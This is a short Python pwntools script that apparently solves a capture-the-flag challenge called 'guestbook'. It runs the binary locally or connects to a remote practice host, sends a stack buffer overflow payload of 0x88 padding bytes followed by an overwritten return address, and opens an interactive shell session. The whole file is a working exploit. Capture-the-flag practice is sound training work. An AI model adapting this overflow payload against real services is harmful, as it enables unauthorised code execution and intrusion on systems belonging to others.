import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./guestbook')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./guestbook')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29520)
			elf=ELF('./guestbook')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		pay='a'*0x88+p64(0x400620)
		io.recv()
		io.sendline(pay)
		io.recv()
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue